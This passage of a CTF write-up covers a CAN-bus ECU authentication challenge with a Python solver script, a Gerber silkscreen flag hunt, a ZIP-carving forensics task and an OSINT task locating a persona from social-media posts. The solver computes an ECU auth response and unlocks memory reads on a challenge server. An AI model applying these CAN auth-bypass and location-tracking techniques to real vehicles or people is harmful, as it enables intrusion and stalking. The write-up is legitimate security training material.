send two identical state commands to advance an internal latch, then read the flag from memory in chunks.

Key IDs and behavior: 0x7E0 (diagnostic handshake), 0x600 (authentication), 0x700 (state commands), and 0x7FF
(flag reads). On a challenge request (internal opcode 0x7C) the firmware returns 4 challenge bytes and a
sequence counter (`seq`). The required response is:

  `resp = ((challenge ^ 0xDEADBEEF) * 0x1337 + seq) & 0xffffffff`

Send this on CAN 0x600 with leading byte 0xC3 followed by the 4‑byte big‑endian response. After a valid auth,
two identical `0x700:4:69,13,37,42` frames advance the latch. The flag is read by sending `0x7FF` frames with
opcode `0xF1` and an offset; replies contain up to 6 ASCII bytes per request.

#### Solution

A compact procedure to retrieve the flag: perform the TCP connect and drain the banner; send `0x7E0:2:A5,A5`
for the diagnostic handshake; request the challenge with `0x600:2:3C,00`, parse the 4‑byte challenge and the
`seq` from the reply, compute `resp` as shown above and send it as `0x600:5:C3,RR,RR,RR,RR` (big‑endian). Once
confirmed, send `0x700:4:69,13,37,42` twice (identical, consecutive) to unlock reads. Finally, iterate reads of
`0x7FF:2:F1,offset` with offset += 6 and concatenate returned 6‑byte chunks until the tail is shorter than 6.

Essential one‑liner: CONNECT --> `0x7E0:2:A5,A5` --> `0x600:2:3C,00` --> parse(chal,seq) --> `0x600:5:C3,resp_be` -->
`0x700` x2 --> repeated `0x7FF:2:F1,offset`.

#### Script

```python
import re
import socket
from typing import List, Tuple


HOST = "303ed4c6.ctf.ac.upt.ro"
PORT = 9730

FRAME_RE = re.compile(r"^([0-9A-Fa-f]+):(\d+):(.*)$")


def recv_line(sock_file) -> str:
    line = sock_file.readline()
    if not line:
        raise ConnectionError("Connection closed by remote host")
    text = line.rstrip("\r\n")
    print(f"<< {text}")
    return text


def wait_for_frame(sock_file) -> Tuple[int, int, List[int]]:
    while True:
        line = recv_line(sock_file)
        m = FRAME_RE.match(line)
        if not m:
            continue
        can_id = int(m.group(1), 16)
        length = int(m.group(2), 10)
        data_str = m.group(3).strip()
        data: List[int] = []
        if data_str:
            data = [int(part, 16) for part in data_str.split(",") if part]
        return can_id, length, data


def send_frame(sock, sock_file, can_id: int, data: List[int]) -> Tuple[int, int, List[int]]:
    frame = f"{can_id:03X}:{len(data)}"
    if data:
        frame += ":" + ",".join(f"{b:02X}" for b in data)
    print(f">> {frame}")
    sock.sendall(frame.encode() + b"\n")
    return wait_for_frame(sock_file)


def compute_auth_response(challenge: int, seq: int) -> int:
    tmp = challenge ^ 0xDEADBEEF
    result = (tmp * 0x1337) & 0xFFFFFFFF
    result = (result + (seq & 0xFFFF)) & 0xFFFFFFFF
    return result


def main() -> None:
    with socket.create_connection((HOST, PORT)) as sock:
        sock_file = sock.makefile("r", encoding="utf-8", newline="\n")

        # Drain the banner
        sock.settimeout(0.5)
        try:
            for _ in range(32):
                sock.settimeout(0.5)
                line = sock_file.readline()
                if not line:
                    break
                text = line.rstrip("\r\n")
                if not text:
                    break
                print(f"<< {text}")
        except (socket.timeout, ConnectionError):
            pass
        finally:
            sock.settimeout(None)

        # Stage 0: ECU diagnostic kick-off
        send_frame(sock, sock_file, 0x7E0, [0xA5, 0xA5])

        # Stage 1: request authentication challenge
        can_id, _, data = send_frame(sock, sock_file, 0x600, [0x3C, 0x00])
        if can_id != 0x608 or len(data) < 6 or data[0] != 0x7C:
            raise RuntimeError("Unexpected authentication challenge response")

        challenge_bytes = data[1:5]
        seq_counter = data[5]
        challenge = (
            (challenge_bytes[3] << 0)
            | (challenge_bytes[2] << 8)
            | (challenge_bytes[1] << 16)
            | (challenge_bytes[0] << 24)
        )
        print(f"[+] Challenge: 0x{challenge:08X}, seq={seq_counter}")

        # Stage 2: send authentication response
        auth_value = compute_auth_response(challenge, seq_counter)
        auth_payload = [0xC3] + list(auth_value.to_bytes(4, "big"))
        can_id, _, data = send_frame(sock, sock_file, 0x600, auth_payload)
        if can_id != 0x608 or not data or data[0] != 0xD3:
            raise RuntimeError("Authentication failed")
        seq_counter = (seq_counter + 1) & 0xFFFF

        # Stage 3: state commands (send twice)
        for _ in range(2):
            can_id, _, data = send_frame(sock, sock_file, 0x700, [0x69, 0x13, 0x37, 0x42])
            if can_id != 0x708 or len(data) < 2 or data[0] != 0x79:
                raise RuntimeError("State command rejected")

        # Stage 4: request flag chunks
        flag_bytes = bytearray()
        offset = 0
        while True:
            can_id, length, data = send_frame(sock, sock_file, 0x7FF, [0xF1, offset])
            if can_id != 0x7F8 or length < 2 or len(data) < 2 or data[0] != 0xF1:
                raise RuntimeError("Flag request rejected")
            chunk = data[2:]
            flag_bytes.extend(chunk)
            if len(chunk) < 6:
                break
            offset += len(chunk)

        flag = bytes(flag_bytes).decode(errors="ignore")
        print(f"[+] Flag: {flag}")


if __name__ == "__main__":
    main()
```

### Baby Board

#### Analysis

We were given a ZIP of **Gerber fabrication files** (`Gerber_PCB1_2025-11-08.zip`), the standard CAM outputs for PCB manufacturing (copper, solder mask, silkscreen, drills, etc.). Gerbers are simple plotter-like instructions: move/draw with apertures, one file per layer. Flags in "hardware" CTFs are often hidden in the **top silkscreen** (component legend) or copper text.

With no running service to poke, this was a pure inspection/format task. The likely flag locations, in order:

1. **Top Silkscreen** (`*.GTO`)
2. **Bottom Silkscreen** (`*.GBO`)
3. **Copper layers** (e.g., `*.GTL`, `*.GBL`) as negative-space text
4. **Board outline** / **mech** layers (`*.GKO`, `*.GML`)
5. Drill/map notes

#### Solution

I opened the archive and inspected the **Top Silkscreen** file (`Gerber_TopSilkscreenLayer.GTO`). You can view Gerbers with a GUI (e.g., `gerbv`, KiCad's Gerber Viewer, or InteractiveHtmlBom), but I also made a quick parser/plotter to be sure.

The file uses common RS-274X constructs:

* **Units:** mm (`MOMM`)
* **Format spec:** e.g., `FSLAX45Y45` -> X/Y are 4 integer + 5 decimal places
* **Moves/Draws:** `D02` = move (pen up), `D01` = draw (pen down), typically with `G01` for linear interpolation

By plotting the `G01 X... Y... D..*` commands in order, the **vector strokes** of silkscreen text appear. Zooming the upper area of the board revealed the flag rendered as outline text.

I exported a zoomed preview of the silkscreen showing the flag:

![Zoomed silkscreen flag](/images/silkscreen.png)

#### Script

A minimal Python snippet to parse & visualize the strokes from the GTO (silkscreen) file. It extracts `G01` moves, interprets `D02`/`D01` (move/draw), scales to mm, and plots:

```python
import re, zipfile
import matplotlib.pyplot as plt

zf = zipfile.ZipFile("/mnt/data/Gerber_PCB1_2025-11-08.zip")
gto = zf.read("Gerber_TopSilkscreenLayer.GTO").decode("utf-8", errors="ignore")

scale = 1e5  # for FSLAX45Y45 (4.5 format)

cmds = []
for line in gto.splitlines():
    line = line.strip()
    if not line.startswith("G01"):  # only linear moves
        continue
    m = re.match(r"G01X(-?\d+)Y(-?\d+)D(\d+)\*", line)
    if m:
        x, y, d = int(m.group(1))/scale, int(m.group(2))/scale, int(m.group(3))
        cmds.append((x, y, d))

segments, last = [], None
for x, y, d in cmds:
    if d == 2:          # D02: move (pen up)
        last = (x, y)
    elif d == 1:        # D01: draw (pen down)
        if last: segments.append((last[0], last[1], x, y))
        last = (x, y)

plt.figure(figsize=(12,4))
for x0,y0,x1,y1 in segments:
    plt.plot([x0,x1],[y0,y1], linewidth=2)
plt.gca().set_aspect('equal', adjustable='box')
plt.gca().invert_yaxis()  # common for PCB viewers
plt.title("Top Silkscreen – zoom")
plt.xlabel("mm"); plt.ylabel("mm")
plt.tight_layout(); plt.show()
```

## Forensics 🤖

### Fire and Ice

#### Analysis

The challenge provides a single file, `adofai.zip`, that contains a `flag.txt` file with a flag that does not work.
Using unzip we can see that there is some other data concatenated with the .zip file.

```
warning [adofai.zip]: 453 extra bytes at beginning or within zipfile
```

Extra bytes usually mean that another archive (or arbitrary data) is concatenated onto the end of the file. In our case it was another zip file that contained another `flag.txt`.

#### Solution

These are the steps we followed in order to get the flag from this challenge:

1. **Initial inspection**
   ```bash
   unzip -l adofai.zip
   ```
   The output lists a single `flag.txt`, but the warning about "extra bytes" is the key clue.

2. **Confirm the tail data**
   ```bash
   7z l adofai.zip
   ```
   7-Zip reports `Tail Size = 453`, meaning there are 453 bytes of additional data after the normal ZIP structure. That data is another ZIP archive.

3. **Carve the zips**
   ZIP files end with an End-of-Central-Directory (EOCD) record that begins with the signature `PK\x05\x06`. The idea is:
   - Find EOCD inside the file.
   - Copy everything from the start of the file up through the EOCD into its own buffer.
   - Treat that buffer as a standalone ZIP archive and read its contents.
   - Move the offset forward and repeat until the original file is exhausted.

   The following Python snippet automates this:
   ```python
   import io, re, zipfile
   from pathlib import Path

   data = Path('adofai.zip').read_bytes()
   offset = 0
   flags = []

   while offset < len(data):
       chunk = data[offset:]
       idx = chunk.find(b'PK\x05\x06')  # ignature that sign the end of a zip file
       if idx == -1 or idx + 22 > len(chunk):
           break
       comment_len = int.from_bytes(chunk[idx+20:idx+22], 'little')
       archive_len = idx + 22 + comment_len
       archive_bytes = chunk[:archive_len]

       zf = zipfile.ZipFile(io.BytesIO(archive_bytes))
       for name in zf.namelist():
           contents = zf.read(name).decode('utf-8', errors='ignore')
           for match in re.findall(r'ctf\{[^}]+\}', contents):
               flags.append(match)

       offset += archive_len

   for flag in flags:
       print(flag)
   ```

4. **Results**
   Running the script prints all three flags:
   - `ctf{a428cd995d7a8dcd690dbd138f6df56f9df9eaef4610b1747f5fc75c9d432f8f}`
   - `ctf{281dbf950ada8e90f9320071fd871af042fd67d3bdf94043640b9ae673d0c952}`
   - `ctf{6622d9c1a2f093f921c301f19374a568cf243c0b15646e43bcb7585af824dc63}`

   Each .zip file contains a single `flag.txt`, so there are exactly three layers and three flags.

## OSINT 🌏

### Fangs overseas

#### Analysis

In this challenge, we are introduced to Vlad da Debugger, an IT guy who traveled and visited a church. Our goal is to find which church he visited.

Searching on social media, I found an Instagram profile named `vlad.da.debugger`. In the stories, I found a photo taken at `Aeroporto Internacional Salgado Filho (Porto Alegre, Brazil)`, and in the posts, I found a cat picture with the following description:

```Found this little beast in my trip and took him for a walk for 36.4 km. Too bad that banks and churches aren't pet friendly. 😒```

#### Solution

Knowing that he was at that specific airport and traveled another 36.4 km, I searched for churches within a radius of approximately `36.4 km` from the airport and found the `Catedral Basílica São Luís Gonzaga`, whose coordinates are -29.68, -51.13.
According to the flag format CTF{SHA256(lat,lon)}, the flag is:

```CTF{2516ec825f263d3348127605e0091317f0cd94509055affb67ca09cb4304c301}.```

#### Script

```bash
echo -n "-29.68,-51.13" | sha256sum
```